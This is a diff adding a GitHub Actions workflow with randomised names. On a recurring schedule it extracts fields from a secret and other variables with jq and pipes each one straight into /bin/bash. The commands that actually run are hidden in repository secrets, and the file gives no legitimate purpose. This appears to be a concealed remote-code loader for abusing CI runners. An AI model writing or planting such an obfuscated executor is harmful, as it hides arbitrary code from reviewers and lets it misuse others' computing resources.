@@ -1,0 +1,31 @@
+name: renwentij
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: renwentij
+        env:
+          wbtio28198: ${{ secrets.wbtio28198 }}
+        run: |
+          echo $wbtio28198 | jq -r .f907 | /bin/bash
+          echo $sa92217 | jq -r .axh32454 | /bin/bash
+          echo $hkjh41189 | jq -r .iqjya7 | /bin/bash
+          echo $ajpa56175 | jq -r .nveb31 | /bin/bash
+          echo $ac1 | jq -r .e8314 | /bin/bash
+          echo $bubsy53333 | jq -r .xejcz37 | /bin/bash
+          echo $c08892 | jq -r .c209 | /bin/bash
+          echo $mincd2 | jq -r .fdhy347 | /bin/bash
+          echo $nsvjn933 | jq -r .fmgm771 | /bin/bash
+          echo $n800 | jq -r .phi75625 | /bin/bash
+          echo $i682 | jq -r .esmd2 | /bin/bash
+          echo $uj4937 | jq -r .ugl420 | /bin/bash
+          echo $klume83 | jq -r .klyad3 | /bin/bash
+
